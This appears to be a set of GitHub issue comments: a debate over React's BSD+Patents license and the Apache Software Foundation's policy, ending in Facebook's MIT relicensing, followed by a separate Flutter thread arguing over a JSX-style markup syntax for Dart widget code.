https://medium.com/@dwalsh.sdlr/react-facebook-and-the-revokable-patent-license-why-its-a-paper-25c40c50b562"
2757	+1
2758	@LawJolla The unfortunate reality is that there are many lawyers in this world and I'm pretty sure they don't all agree. :)
2759	@CoreyDotCom Then in cases where lawyers don't all agree, is the solution to take the most risk adverse position possible?  Or is the solution to understand the problem and take the most reasonable position?
2760	Perhaps it would be to follow suit with a defacto standard open source license and avoid contention.
2761	@CoreyDotCom Apple uses similar terms.  And your reply doesn't address my question.
2762	@LawJolla Your argument is a good one for certain scenarios. But it’s tricky when the subject is a small startup without major funding. Rewriting a product to strip out React isn’t trivial for a small startup who may have built their product with it. I’ll use WordPress as an example. If WordPress adopts React, which they are currently using to build the Gutenberg project which is the planned replacement for the main editor in WordPress, it could have consequences to the entire WordPress ecosystem of commercial WordPress products. Yes, many of these are small businesses. But, many of these have also been acquired by bigger businesses. If WordPress adopts React and that startups product is built on top of WordPress... those bigger businesses could back out of acquisitions because their legal team raises a red flag during due diligence over the React clause. We already know there are companies that shy away from React for this reason. And if they had to strip our React it would basically mean rewriting it at which point the co Lang could just decide to build itself instead of acquiring the other company. If WordPress adopts it, do those same companies shy away from WordPress because they’ve used React for major functionality? When you most certainly could not afford litigation you’d want to take the most risk adverse path. Sometimes the most reasonable path is too much of a risk. I hope FB just updates the license so nobody ever has to find out if it is a paper tiger or not.
2763	"@carlhandcock My argument holds for all companies. Start ups don't have a patent portfolio to sue Facebook. 

People seem to keep missing the salient point... for anything to happen, you need to sue Facebook. And if you have a good patent claim against them, and have the money to file the suit, you have the money to take React out. (Or don't. Assuming Facebook has any patents protecting React -- they most assuredly don't -- they can't show lost profits or reasonable royalties)"
2764	"@LawJolla Also the author somehow assumes that there are no patents for React, which I doubt is true. Besides, this issue is bigger than React. It applies to all open source libraries that use same Facebook BSD+Patents. And, I am pretty sure that there are numerous patents filed for those libraries.

> you have the money to take React out.

It's matter of money, energy, and time. If you see ASF's comments, ASF says they don't want to do it. I am sure they have money for it if they have to. But, it does not mean they like to do it or is any beneficial to them or any other companies that uses ASF's products. If this non-standard licensing trend continues to other big companies and all of their open source projects, then open source projects will lose their true meaning."
2765	@joonhocho I'm the author. I didn't assume. I looked. And after 10000 reads not a single person has come forward with a plausible patent. 
2766	"@LawJolla - you write that it's a ""toothless"" claim and only applies to React, which you _think_ has no related patents.  But the PATENTS file is found in most Facebook repos (Immutable, GraphQL, Jest, Flow, Hack, HipHop, etc.), and it's becoming part of dependencies of dependencies. If it is a dangerous file, then the entire Free software ecosystem is getting damaged.

I don't think that you have addressed every scenario in your post. Also, some large and small tech companies seem to disagree, or at least they aren't ready to risk it."
2767	"@LawJolla Even if what you are saying is true, it has and is creating a lot of friction in the ecosystem whether it's just paranoia or not. One obvious example is this thread and numerous other threads on HN, Reddit, GitHub related to React's BSD+patents over the past few years.
Many companies including big ones have shied away from using React for this very reason. ASF is currently challenging it. People here are trying to change it, and I hope it does."
2768	"@joonhocho I can't disagree with that.  Fighting for more open licenses, even if the rationale is couched in unfounded paranoia, isn't a bad thing.

@j127 There's a ton of bad legal advice and ignorant paranoia, so the fact that some won't risk it is unsurprising."
2769	@LawJolla - Your arguments haven't addressed Immutable, GraphQL, Jest, Flow, Hack, HipHop, and all the other places that the file appears.
2770	@LawJolla I’m not missing your point. I outlined an example in my reply on how it can impact a business from an acquisition standpoint. The small business does t have to have a patent portfolio. A big business interested in acquiring the small business could have the patent portfolio and opt not to acquire the small business because they don’t want to deal with the headache since as you said... they could just strip out the React so why not just write it yourself instead of acquiring a product you’ll have to rewrite and strip out the React from anyway? And FYI the lawyer from Automattic is speaking specifically about Calypso and Automattic as a business — and states they don’t have any patents anyway. But Automattic isn’t WordPress the open source project and how many businesses with patent portfolios use WordPress? A lot. How many of those will rethink WordPress using the open source project if they introduce key functionality written in React, which looks like a possibility with the Gutenberg project that is in Beta? I don’t know the answer to that. But like you said small businesses are unlikely to have patent portfolios.  But big businesses use WordPress too.
2771	It's clear that tin-foil hat, nonsensical hypotheticals rule this issue and further attempts at common sense will fall on confirmationally biased deaf ears.  Good luck with the React license, UFOs, and faked moon landings. 🤗
2772	"Dennis,

That really wasn't necessary. Not helpful, either."
2773	"A GitHub issue is a poor venue to discuss legal theory. It also detracts from the original request: would Facebook be amenable to relicensing React to something other than FB/BSD+Patents ?

And in that vein, there isn't really anything to discuss. The real discussion is internal to Facebook, and we can/should simply wait for their decision and/or explicit request for further community feedback."
2774	昨天晚上熬夜看React教程，如果Facebook不改授权协议，我只想说一句话：“打死你个龟孙！”。
2775	"@kideny 
it's unfair to facebook.

I also dislike the patent of React, and all facebook Repos with it.

But it's the right for facebook who develop and deploy it.

How about GraphQL? React Native? and More?

`Weex` includes `Yoga`, but `Yoga` also includes the patent.

Maybe in the future, most of repos will includes its patent by big business.

☹️"
2776	[Vuejs](https://github.com/vuejs/vue) is a good choice, which is a MIT-licensed open source project. It is free and simple to use.
2777	"How about [Preact](https://github.com/developit/preact)?

But no `Preact-Native`...

 😂"
2778	C'mon people, let's stay on topic here…
2779	FWIW, my company's legal department sees no issue with us moving forward with react under the current licensing scheme.  I suppose it depends on what your product it.
2780	This thread is in danger of being closed I have no doubt. Can we please stick to the topic at hand. This is an incredibly important issue for a lot of us, the react team are doing us a service allowing us to continue to communicate here. Let's try to not add pointless input that may otherwise hinder any progress or cause us to lose this channel.
2781	"> FWIW, my company's legal department sees no issue with us moving forward with react under the current licensing scheme. I suppose it depends on what your product it.

There's been a lot of confusion and misleading information around this issue, and it only got worse as it blew up on HN and Reddit and news sites.

The React licence/patents situation is no different today than it was a month ago. There is no need to switch away from React if you are already using it. The question of whether **your company** allows the use of React due to its licence/patents is a question for **your company**'s lawyers.

The only thing that happened is that the Apache Software Foundation's lawyers have said that they do not find the licence to be appropriate for **their** projects. Thus, the Apache Software Foundation has instructed all of **its** projects to move away from Facebook BSD+Patents code by August 31st.

This does affect several ASF projects including CouchDB, Cordova, and Superset (incubator) – which is why this issue was opened – but it has no bearing on non-ASF projects (even if they are licensed under the Apache 2.0 licence)."
2782	"I really don't think this issue should be turned into an opinion poll about the licensing situation. There are people who already cannot use react but want and there are a few more due to the ASF change that have issues with this now.  This issue is already being discussed to death.

I'm pretty sure I'm not the only one who is subscribed to this issue to receive updates on the licensing situation and not to have my inbox swamped with more opinions about it. Maybe the actual discussions about the usefulness or not could be had elsewhere?"
2783	"So this issue is a request to re-license,  or just complains? or find a reason to make it?

I cannot getting something of value from it."
2784	"This issue is only us (CouchDB PMC) asking Facebook if they would consider changing the license to the Apache Software License 2.0.

We have to either remove the parts of our project that use React or port them to something else if this doesn't happen. We would much prefer to continue using React if the license is changed to one that the ASF accepts and it's far simpler if that's the ASL 2.0 license. We are not making demands or threats and we're not even commenting on the wider social or legal aspects in this forum, fascinating though they are.

The only response we are really waiting for is from Facebook (either directly or via a suitably authorised member of the React team).

There have been many excellent comments on the thread and it helps to see that the concern here is felt by others, but I for one would welcome the thread staying closer to the original goal.
"
2785	"I think it was understated by it only affecting a ""few ASF projects"". It affects every single open source project that uses react on either the backend or the front end, this includes WordPress. We can't expect users of *OUR* projects to respect a patent rider. You can't release your project as BSD if the license of any dependency is on the X list. So basically you can't license your project under anything but Facebook's license."
2786	@victoriafrench That's not strictly true.  You can release your software under any license you want.  Your license doesn't affect the terms under which React is licensed.  The license of your software applies to how the users of your software are allowed to use it.  React's license affects how you use React, not how your users use your software.
2787	"@JayAndCatchFire that is not true. If you were to release Wordpress under BSD and it used a GPL component, you become GPL. Now any developer who creates any form of plugin for Wordpress is now also GPL. This is the reality. You can not use a license under X without distributing your product under the same license and it chains down from there. This is standard copyright licensing law, every attorney will tell you the same thing.

Let's move this over to motion picture. I use a video clip that has a non-theatrical license that I use in my after effects CGI template and I license that as CC. Marvel comes and uses my CGI template. Marvel can not release the movie to theaters because the non-theatrical license travels up the chain.

It's called a ""chain of title"" and applies to all copywritten work.
"
2788	@victoriafrench I completely agree in the case of GPL.  GPL is a viral license.  Also, Wordpress is already licensed under GPL.  But none of the software involved in this discussion (React, Apache Foundation's software, and various companies' proprietary software) is under a GPL license.  We're talking about APL and BSD, neither of which are viral licenses.  The PATENTS file doesn't change that.
2789	"The lawyers from Apache have made their decision - the licenses are incompatible.  Facebook lawyers have said as much, too, according to the public discusion on the apache mailing list.  (linked above in one of my previous comments).

This is a request to change the license.  

There is always a lot of speculation as to what the license means.  There are many differing opinions.  Facebook has an [FAQ about the license](https://code.facebook.com/pages/850928938376556).  They made a [clarification post](https://code.facebook.com/posts/1639473982937255/updating-our-open-source-patent-grant/) when it was last updated.

This request, per comments above, is being discussed internally at Facebook.  They will decide what to do soon enough.

Individuals, projects, and companies can decide whether it's a good decision to use software with this or any other license.  There are [many online discussions](https://duckduckgo.com/?q=facebook+license+discussion&t=ffsb&ia=web) on this topic in more appropriate forums than a github issue.

If you are similarly having difficulty leveraging React for legal reasons pertaining to the license, that would be great information to add to the issue comments.  

If you are looking to change people's minds about how to interpret the license, this isn't the place to do it.  

I would caution anyone from leveraging a legal opinion from this issue discussion.  Most of the participants are not Facebook employees, and nobody has made an official statement clarifying the parameters of the license in this thread.  

Besides, not very many lawyers have github accounts.  "
2790	"@nevetS to clarify: the Foundation did *not* say the licenses were incompatible. ... The Foundation said that its projects could not depend upon components using the FB/BSD+Patents license because it would introduce requirements over/above those of the ALv2.

Over the course of this discussion (here/elsewhere) several lawyers have stated the licenses are not incompatible. It is just that incorporating both into a larger Work means that you have *two* sets of requirements (ALv2 and FB/BSD+Patents). That larger set of requirements can be *perfectly acceptable* to some developers and the software they release.

By policy, that combination is not acceptable to the Foundation. Simple as that.
"
2791	Open source should not rely on a patron's sympathy that can be revoked at any hint of conflict. Either open source a project and openly collaborate or keep it closed source. Softening this up with a Frankenstein license is counterproductive and extremely dangerous - if this sets a precedent and you have to accept additional clauses for every open source project you use, we will all suffer tremendously. The suggestion is a much cleaner solution for everyone. If this clause is only a paper tiger like some claim, it should not exist and if it is not, then this project is not open and has to be approached with extreme caution in most scenarios. In short: While I apologize for adding another opinion, the suggestion to relicense seems very well-founded. We recently had to decide against React for this reason and that's a shame.
2792	"Active committer on Apache Superset (incubating) here https://github.com/apache/incubator-superset, and ex Facebooker. Like CouchDB we're caught in the Facebook/ASF crossfire and would just like to use React to build and share [truly unlimited, surprise-free] open source software.

Regardless of the legitimacy, true meaning and applicability of the patent clause, we'd like for Facebook to play by the same rule as everyone else in the open source space and produce a standard, condition-free BSD license for React.

I was largely unaware of this issue when the team chose React for Superset, and for us to backtrack on either on the ASF or React side would be extremely counterproductive. ~~Or worse, another option might be to tip-toe around by not distributing React in our releases and have the users build the software on their own to defer liability [not an option].~~

Personally (and based on my limited understanding of the legal implications) I think it's unethical for Facebook to buy itself some sort of patent lawsuit immunity through its popular open source software.

[Also related] If Facebook sticks with the current patent clause, I'd like to see the `npm` license metadata changed to reflect `Conditional BSD` or something that makes it clear that it isn't good old `BSD`, so that when we use package managers to import libs, and recurse through dependencies to understand the tree of licensing implications, that somehow this would bubble up as something important to understand, research and validate with our lawyers and software foundations. "
2793	@gstein not sure what you mean, Facebook has been told that it's not compatible by [foundation members](https://issues.apache.org/jira/browse/LEGAL-303?focusedCommentId=16046579&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-16046579)
2794	"@johnament I think that Greg is referring to a definition compatibility which says that two licenses are incompatible if there is no logical way to combine software components under the two licenses. For instance, CDDL and GPL are classic in this case since they both put limits on how the derived work must be licensed and the limits have no intersection.

There is another definition of compatibility and that is upstream policy compatibility. That is the problem at Apache. We don't (as you know better than I) allow dependencies that inhibit field of use or other aspects of use. As such, the patents rider on BSD+Patents is incompatible with Apache's policy.

There is nothing, however, that says that I can't use an Apache licensed component together with react if I am happy about that. I would just wind up with a derived work that imposes the same patent behavior on my users. I can't bring the combination back to Apache and suggest it be a project. But I can use it outside of Apache's policy confines.

In sum, I agree with both of you. :-)
"
2795	@tdunning Could be.  I'll let Greg comment on what his intentions were, but my reading of Roy's comment is that the licenses themselves are not compatible with one another (e.g. you couldn't dual license code under both of them).  Speculatively, this is because ALv2 includes an irrevocable claim while the FBPL includes an explicit revocation clause.  This is also probably why we can't include it, at the roots of it, because there is partial code that is potentially revocable.
2796	"Very simple, @johnament ... I said that @nevetS was incorrect when he asserted ""The lawyers from Apache have made their decision - the licenses are incompatible."" ... Our lawyers have made no such declaration. And the referenced ASF Member is not a lawyer, let alone one representing the Foundation.

The Foundation has said it will not allow FB/BSD+Patents for *policy* reasons (I'd have to look, but I don't even think our lawyers weighed in, at all). It has nothing to do with compatibility, and the Foundation has made no assertions or declarations about compatibility.
"
2797	"Apologies for stirring the pot on that @gstein - I myself had the wrong impression and shouldn't have made that statement without verifying.

It would be nice if those with legal team resources like the ASF would somehow publicly weigh in on the topic."
2798	"No worries, @nevetS ... easy enough to clarify.

Unfortunately, the ASF cannot provide legal advice. The crazy thing about the legal profession is that no lawyer will provide such advice either, unless and until you are their client covered under a retainer agreement. That's why you'll see commentary [from lawyers] marked as opinion, and in their second breath tell you to retain your own lawyer for advice :-)
"
2799	"+cc top contributors @zpao, @spicyj, @sebmarkbage, @gaearon 

Multiple projects at the ASF (CouchDB, Cordova, and Superset) are in limbo and many of us would like for Facebook to communicate and clarify whether:
* the stance on the patents clause is firm and will not change
* people are debating internally at FB and will come up with clarification (an ETA would be great!)
* things are moving in the direction of a standard, ASF approved license (?!)

Personally I ❤️  React, ❤️ the ASF, and ❤️  open source software. Please allow us to share things built on top of React!"
2800	I have been waiting for more than two weeks and felt very disappointed now. We can change nothing but just go away. Goodbye react && Hello angular.
2801	I'm pretty sure there will be no public decision until ~31 August because of corporation-enterprise etiquette
2802	"Calm down. At least the Facebook legal team (!!!) is looking into it. That by itself should be considered almost nothing short of divine intervention. Past that, it's going to be a waiting game, and that should be expected of anything related to legal work. Not much anyone of us can do here right now, but sit, and wait. If you can't sit and wait, go learn Vue, or something in the meantime. It's not going to kill you.

Your complaining is only going to make things worse at this point. They already know that we don't like how things are right now. They get it. I'm sure they're sick of listening to this thread. If there are more pointless comments in this thread, you bet your ass this thread will be locked down and shoved in the attic to collect dust."
2803	I too share @mistercrunch's and @OlegLustenko's thoughts/concerns. We'll likely need to wait until August 31st to hear something on this from Facebook.
2804	Any progress？
2805	Hi all – thanks for waiting patiently. We still don't have anything to announce right now but will update here when we do. 
2806	Come on Facebook, do the right thing!
2807	Come on Facebook, do the right thing!
2808	Please stop.
2809	If you can't sit and wait, go learn Vue, or something in the meantime. It's not going to kill you.
2810	Sure some people can sit and wait but when you have production code, time is money.  And for a company it could become very expensive to rewrite code simply because you have to change your framework. Imagine you hired React JS developers, do you keep them and hope they could learn another framework, or do you look for other staff.
2811	@coding102 You can use use [preact](https://preactjs.com), with preact-compat it should be fully compatible with react. 
2812	I agree with spicyj: Please stop. Those discussions certainly have a place (e.g. a forum), but are misplaced in a Github issue which only deals with a very specific request. Furthermore, we have reached a point where we are waiting for a specific response. Your comments are well-intentioned (and I'm impatiently awaiting the result myself), but this should be discussed somewhere else, e.g. [here](https://www.reddit.com/r/programming/comments/6nnxir/apache_foundation_bans_use_of_facebook_bsdpatents/), [here](https://www.reddit.com/r/reactjs/comments/6nx6jv/is_anyone_here_concerned_about_the_recent/) or [here](https://news.ycombinator.com/item?id=14779881). We also had preact mentioned twice before - repetitions do not contribute anything.
2813	"[As Adam mentioned today](https://code.facebook.com/posts/112130496157735/explaining-react-s-license/), we want to be able to open source technology that is part of our most successful products. That's why we had to rethink how we could approach our licensing practice without further opening ourselves up to frivolous lawsuits and why it will remain in place. I'm sorry that this has caused so much churn in the community. Some even feel like they have to stop using UI frameworks because of it.

I understand that some organizations may choose to have policies against this type of license on principle. I like that we clearly include a patent license in our repo. IMO it would be nice if more companies would choose this route too. I was surprised by the ASF's decision since our license hasn't changed in years now. I think that's unfortunate because it works against companies trying to open up while protecting their business. It also creates a lot of churn for people building and combining great technologies. I wish this was normalized.

I'd like to keep working on giving more protection to ideas with many diverse implementations. Let's create an environment for that to happen. I'll close this out for now but let's keep the broader discussion going.

"
2814	"We’re relicensing React, Jest, Flow, and Immutable.js under the MIT license. 
I hope that this addresses your concerns.

https://code.facebook.com/posts/300798627056246/relicensing-react-jest-flow-and-immutable-js/

"
2815	"React Native (including Metro, Fresco, and Yoga) has also been relicensed as MIT.

https://github.com/facebook/react-native/commit/26684cf3adf4094eb6c405d345a75bf8c7c0bf88"
2816	cc @lukechurch 
2817	@cbazza Can you elaborate on why you want this? Maybe show an example of what it would look like compared to today?
2818	"Ok, so the ""Basic widgets"" example on 'https://flutter.io/widgets-intro/#basic-widgets' would look like the following:
```dart
import 'package:flutter/material.dart';

class MyAppBar extends StatelessWidget {
  MyAppBar({this.title});

  // Fields in a Widget subclass are always marked ""final"".

  final Widget title;

  @override
  Widget build(BuildContext context) {
    let style = {
        height: 56.0, // in logical pixels
        padding: const EdgeInsets.symmetric(horizontal: 8.0),
        decoration: <BoxDecoration color={Colors.blue[500]}/>,
    };
  
    return <Container style={style}>
      <Row>
        <IconButton
            icon={<Icon name={Icons.menu}/>}
            tooltip='Navigation menu'
            onPressed={null}
        />
        <Expanded>
           {title}
	</Expanded>  
        <IconButton
            icon={<Icon name={Icons.search}/>}
            tooltip='Search'
            onPressed={null}
        />
      </Row>
    </Container>;
  }
}

class MyScaffold extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // Material is a conceptual piece of paper on which the UI appears.
    return <Material>
      <Column>
          <MyAppBar
             title={<Text 
               text='Example title'
               style={Theme.of(context).primaryTextTheme.title},
             />}
          />
          <Expanded>
            <Center>
              <Text text='Hello, world!'/>
            </Center>
          </Expanded>
      </Column>
    </Material>;
  }
}

void main() {
  runApp(<MaterialApp
    title='My app'
    home={<MyScaffold/>}
  />);
}
```
"
2819	"How about this syntax?:

```dart
import 'package:flutter/material.dart';

class MyAppBar extends StatelessWidget {
  MyAppBar({this.title});

  // Fields in a Widget subclass are always marked ""final"".

  final Widget title;

  @override
  Widget build(BuildContext context) {
    return Container(
      height: 56.0, // in logical pixels
      padding: EdgeInsets.symmetric(horizontal: 8.0),
      decoration: BoxDecoration(color: Colors.blue[500]),
      child: Row(
        children: <Widget>[
          IconButton(
            icon: Icon(Icons.menu),
            tooltip: 'Navigation menu',
            onPressed: null,
          ),
          Expanded(
            child: title,
          ),
          IconButton(
            icon: Icon(Icons.search),
            tooltip: 'Search',
            onPressed: null,
          ),
        ],
      ),
    );
  }
}

class MyScaffold extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // Material is a conceptual piece of paper on which the UI appears.
    return Material(
      child: Column(
        children: <Widget>[
          MyAppBar(
            title: Text(
              'Example title',
              style: Theme.of(context).primaryTextTheme.title,
            ),
          ),
          Expanded(
            child: Center(
              child: Text('Hello, world!'),
            ),
          ),
        ],
      ),
    );
  }
}

void main() {
  runApp(MaterialApp(
    title: 'My app',
    home: MyScaffold(),
  ));
}
```"
2820	"Huumm, a little improvement but not so good... 
Here are the things that gets accomplished by using XML:
(1) No more 'child' & 'children' stuff
(2) easy for 3rd party tools to manipulate (parse, analyse and regenerate)
(3) notice that the switching between markup and programming is easily detected. I mean inside XML you have '{}' to delimit code and in code you have '<Capital' to delimit markup. 
Also separate all the 'style' things from the main structure.
I know this is basically fully endorsing React's way but you are half way there anyways ;)
"
2821	cc @kasperl
2822	"> (1) No more 'child' & 'children' stuff

I don't really understand why that's desireable. ""child"" and ""children"" aren't special. Consider ListTile for example. How would you do that one? Why are ""icon"" in IconButton, or ""home"" in MaterialApp, something you want to give a name for, but not ""child"" in Expanded? All three are just arbitrary arguments that happen to take Widget objects. There's nothing magical about ""child"" vs ""home"".


> (2) easy for 3rd party tools to manipulate (parse, analyse and regenerate)

You can parse, analyze, and regenerate Dart code. But I agree we should make that easier. Hopefully in the coming years the Dart team will provide better APIs for this.


> (3) notice that the switching between markup and programming is easily detected.

Why is that desireable? I mean, why would any of this count as ""programming""? It's all just expressions.


> I mean inside XML you have '{}' to delimit code and in code you have '<Capital' to delimit markup. 

I don't really understand the distinction.


> Also separate all the 'style' things from the main structure.

You can do this today in Flutter if you really want to, just put the style in a variable like you did in the XML case."
2823	"> I don't really understand why that's desireable. ""child"" and ""children"" aren't special. Consider ListTile for example. How would you do that one? Why are ""icon"" in IconButton, or ""home"" in MaterialApp, something you want to give a name for, but not ""child"" in Expanded? All three are just arbitrary arguments that happen to take Widget objects. There's nothing magical about ""child"" vs ""home"".

Less boilerplate, you don't need to say it because it is inherited in the structure.

> Why is that desireable? I mean, why would any of this count as ""programming""? It's all just expressions.

It's related to (2) because it makes life of toolmakers, specially GUI builders, much easier since they don't need to fully parse Dart; but it also makes reading the code easier. 

> I don't really understand the distinction.

The format of XML is very simple so when you see '{}' you know it is calculating an expression in dart. Same for the opposite, when reading dart code and you see '<Capital' (a less-than followed by a word that is capitalized. example \<Row>) you know that an object hierarchy is being created from XML markup.

"
2824	"Also in the final XML processor I would avoid passing objects to attributes of parents and instead create child tags as below:
```dart
this...
          <MyAppBar>
             <Title style={Theme.of(context).primaryTextTheme.title}>  
                 Example title
             </Title>
          </MyAppBar>

instead of this...
          <MyAppBar
             title={<Text 
               text='Example title'
               style={Theme.of(context).primaryTextTheme.title},
             />}
          />
``` "
2825	"> Less boilerplate, you don't need to say it because it is inherited in the structure.

But why only for some of the properties? And how do you handle cases where there's two child slots, like ListItem? XML-ish syntax just doesn't seem to handle this very well.

Also I'm not really sure it's less boilerplate.

Compare:
```xml
   <Container style={style}>
      <Row>
        <IconButton
            icon={<Icon name={Icons.menu}/>}
            tooltip='Navigation menu'
            onPressed={null}
        />
        <Expanded> {title} </Expanded>  
      </Row>
    </Container>
```

```dart
   Container(style: style,
      child: Row(
        children: [
          IconButton(
            icon: Icon(Icons.menu),
            tooltip: 'Navigation menu',
            onPressed: null,
          ),
          Expanded(child: title),
        ],
      ),
    )
```

It's not at all clear to me that the XML-ish syntax is cleaner or less boilerplatey. There's lots more punctuation, and some duplication of content (e.g. in the close tags). And you had to add some names, so sure, you lose ""child"", but you gain ""name"" on Icon.

Also with XML how do you make it clear that Row can take zero, one, or more than one child, while Center has to have exactly one child? What would happen if someone did this?:

```xml
   <Center> <Test/> <Test/> </Center>
```

> It's related to (2) because it makes life of toolmakers, specially GUI builders, much easier since they don't need to fully parse Dart;

They wouldn't need to fully parse Dart if we had a Dart parsing API either, though, right? I mean, you'd parse what you want to parse and leave the rest. Also I'm not sure it's actually easier to parse, since it's not actually XML; see below.

> but it also makes reading the code easier. 

I'm not at all convinced that the XMLy version here is easier to read. Once you've read a few build functions, you quickly get used to the nested constructor syntax.

> The format of XML is very simple so when you see '{}' you know it is calculating an expression in dart.

It's not actually XML, though, right? It's some variant of XML. Are there well-defined parsing rules for it? For example, is this valid?

```xml
  <Test name={describe(""}"")}>
```

How does it know that the first ""}"" isn't the end of the attribute expression, without parsing Dart?

> Same for the opposite, when reading dart code and you see '<Capital' (a less-than followed by a word that is capitalized. example \<Row>) you know that an object hierarchy is being created from XML markup.

You know this today when you see the `new` keyword too, right? Or indeed in the new-less markup proposal above when you see any capitalised word. Is this really a benefit of XML, or are you more familiar with XML than Dart?

> Also in the final XML processor I would avoid passing objects to attributes of parents and instead create child tags as below:

I really don't understand what you're proposing here. It's not well-formed XML at all as far as I can tell. Can you elaborate on exactly what the syntax you are proposing is and how it works? For example, the ""Text"" constructor seems to have disappeared; how does the processor know that <Title> creates a Text widget?


Sorry if I sound defensive or aggressive. :-) This is a topic that's come up several times but I've never had someone willing to actually argue the case before so I'm finding this conversation very useful in teaching me what the reasoning behind the request is. Please don't take my argumentative tone as dismissive, I'm very interested in your input here."
2826	"Look, you are mixing everything I say and this conversation is going nowhere. In legal terms you are ""Badgering the witness"".

If you are really interested in learning why JSX is hot, just google for ""react tutorial"" and notice that for the past 2 years all articles on React use JSX. The original way of creating component hierarchies in React (which is equivalent to the current way in Flutter) is never mentioned again because JSX became the preferred method (best practice).

https://facebook.github.io/react/tutorial/tutorial.html
https://facebook.github.io/react-native/docs/flatlist.html

Another interesting thing is that Typescript has adopted JSX also:
https://www.typescriptlang.org/docs/handbook/jsx.html

You failed to grasp that XML parsing (with some extra code to skip '{}' properly) is orders of magnitude simpler than fully parsing a programming language like Dart. That is a fact. You are assuming that tool builders will use Dart on their development, not the case, Intellij most likely is using Kotlin and Java on their IDEs that supports Dart (they are a special case because they specialize in language parsing; everybody else will struggle to fully parse Dart from another language).

What I like about putting XML inside another language is that it provides a cognitive separation between the two because XML is very distinct from programming languages. Just scrolling through the source file you can easily see what is code and what is declarative markup. Can't accomplish that with dart code pretending to be markup. 

Stop nit-picking things that are not fully specified. All your doubts have answered for it just learn more about how that was handled in JSX. I just don't have the time for this here.
"
2827	"My apologies if I sound defensive or aggressive. This is a topic that's come up several times but I'd never had someone willing to actually argue the case before so I was finding this conversation very useful in teaching me what the reasoning behind the request was. Please don't take my argumentative tone as dismissive, I'm very interested in your input here.

Please don't feel you have to reply. I'm commenting here so that there is transparency regarding the issues that we would have to resolve before we're able to make a decision or design one way or the other. This is basically just a Socratic dialogue. Your participation is welcome but certainly you should not feel that it is your responsibility to defend your proposal.

----

I've no doubt that JSX is ""hot"". In React, the non-JSX syntax is a lot worse than the alternative syntax proposed in this issue (the one that looks like our current code but without the ""new"" and ""const"" keywords). What I'm trying to understand is whether the same reasons that JSX is ""hot"" in React apply to Flutter.

Regarding TypeScript doing JSX, In 2012 I was involved in efforts to specify [E4H](http://www.hixie.ch/specs/e4h/strawman), and even before that there was [E4X](https://en.wikipedia.org/wiki/ECMAScript_for_XML). Both efforts died. So it's important to me that we understand what exactly it is people like about JSX vs other syntaxes.

Parsing XML isn't easy, parsing sort-of-XML-but-with-curly-braces-somehow is not easy either. Parsing sort-of-XML-but-with-curly-braces-somehow-that-is-embedded-in-another-language is even less easy. However, how easy that is to implement probably isn't a big deal because it's going to be implemented once or twice and then the library that does it will be reused. (I've been heavily involved in writing the specs for parsing HTML and been involved in similar work for XML, and I've implemented a parser for Dart, so I have a pretty good idea of how difficult parsing markup languages vs programming languages actually is.)

> What I like about putting XML inside another language is that it provides a cognitive separation between the two because XML is very distinct from programming languages. Just scrolling through the source file you can easily see what is code and what is declarative markup. Can't accomplish that with dart code pretending to be markup.

But why is it beneficial to be able to do that?

It's pretty obvious when scrolling through Flutter apps where the build functions are (they're the giant nested expressions). What is it about ""declarative markup"" that is important to separate from ""code""?

> Stop nit-picking things that are not fully specified. All your doubts have answered for it just learn more about how that was handled in JSX. I just don't have the time for this here.

As far as I can tell, JSX doesn't handle the things I was asking about. For example, React doesn't have the concept of child slots. The closest thing I could find is something they do by switching back to JS then back to JSX inside that, so you'd need to be able to parse both the programming language and the markup language."
2828	"> What I'm trying to understand is whether the same reasons that JSX is ""hot"" in React apply to Flutter.

Yes, the exact same thing applies here. The current way looks good to you because that's the only option you have. Give people a second option and the same will happen. 

Whether E4X died or not is irrelevant because nothing lives forever. I have used ActionScript with E4X a lot and thought that Adobe did an excellent job there. In a way Flutter is just a newer version of Adobe Flash with Flex apps.

> (I've been heavily involved in writing the specs for parsing HTML and been involved in similar work for XML, and I've implemented a parser for Dart, so I have a pretty good idea of how difficult parsing markup languages vs programming languages actually is.)

Great so you know that parsing a markup language is trivial compared to parsing an imperative programming language.

> But why is it beneficial to be able to do that?

Code readability and simplicity which in turn drives a whole bunch of other benefits.

> It's pretty obvious when scrolling through Flutter apps where the build functions are (they're the giant nested expressions). What is it about ""declarative markup"" that is important to separate from ""code""?

On your giant nested expressions can you easily see structure? can this structure be easily manipulated by other tools like GUI builders interchangebly ? I mean like Adobe Flex Builder use to do, drag and drop widgets around, wire them on UI and then switch to code view and just edit anything you want and then switch back to gui mode and continue to manipulate the widgets. You can't do that easily when the programmer goes inside your ""giant nested expressions"" and writes any valid dart code that doesn't follow the structure that the GUI editor is expecting. With a fixed XML structure that is not a problem.

> As far as I can tell, JSX doesn't handle the things I was asking about. For example, React doesn't have the concept of child slots

It handles it just fine, you just don't know how to do it. So going forward just put the example in question here and I will provide you with what I think the JSX version should be.
 
```dart
  new ListTile(
    title: new Text('CineArts at the Empire',
        style: new TextStyle(fontWeight: FontWeight.w500, fontSize: 20.0)),
    subtitle: new Text('85 W Portal Ave'),
    leading: new Icon(
      Icons.theaters,
      color: Colors.blue[500],
    ),
  ),
```
```dart
  <ListTile>
    <title> 
      <Text style={{fontWeight: FontWeight.w500, fontSize: 20.0}}>
         CineArts at the Empire
      </Text>
    </title>
    <subtitle>
      <Text>85 W Portal Ave</Text>
    </subtitle>
    <leading>
      <Icon data={Icons.theaters} color={Colors.blue[500]}/>
    </leading>
  </ListTile>,
```

It looks longer than the dart version but I could had placed everything in the same number of lines. Thing is an IDE/Editor can provide '+' & '-' to expand and collapse these XML nodes anyways.

Make Flutter look familiar to React developers and you have a chance of attracting a bunch of new users to Flutter.

"
2829	"> Whether E4X died or not is irrelevant because nothing lives forever.

Whether it died isn't the issue, it's why it died. Did it die because it didn't provide a solution that people wanted? Did it die because of implementation issues? Did it die because of patent issues? Was it too early? Too late? I think it's important to learn lessons from past experiences. Why did E4X and E4H fail where JSX has succeeded?

What I find interesting is that people who are new to Flutter often ask for two things: a markup language, and animated GIFs. Then three months in, they are still asking for animated GIFs, but not for a markup language. It could be that this is because the markup language isn't actually needed once you're used to writing build methods in Dart. It could be that they still want a markup language but have worked around the omission and so don't think to ask anymore. It's worth figuring out which because otherwise we risk spending effort on something that is the wrong choice (in either direction).

> On your giant nested expressions can you easily see structure?

Yes, at least as easily as with XML. Personally, I find XML to be very verbose and it obfuscates the structure. But I think this is more about what you're used to.

